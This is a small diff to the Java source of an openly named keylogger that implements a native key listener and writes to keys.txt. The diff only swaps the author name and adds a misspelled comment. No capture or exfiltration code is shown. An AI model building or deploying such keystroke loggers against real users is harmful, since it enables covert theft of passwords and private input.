@@ -17,13 +17,14 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 /**
- * @author vakho
+ * @author Rushikesh
  */
 public class KeyLogger implements NativeKeyListener {
 
 	private static final Path file = Paths.get("keys.txt");
 	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 
+	//This is the main methed
 	public static void main(String[] args) {
 
 		logger.info("Key logger has been started");
